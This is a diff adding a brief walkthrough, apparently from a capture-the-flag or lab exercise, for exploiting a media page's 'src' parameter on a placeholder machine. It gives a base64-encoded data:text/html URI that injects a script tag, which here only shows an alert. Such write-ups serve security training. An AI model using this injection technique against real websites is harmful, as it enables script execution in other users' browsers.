@@ -1,0 +1,7 @@
+go to machine-ip/index.php?page=media&src=nsa
+
+change the query parametre src to data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGkiKTs8L3NjcmlwdD4= 
+
+refresh the page
+
+done.
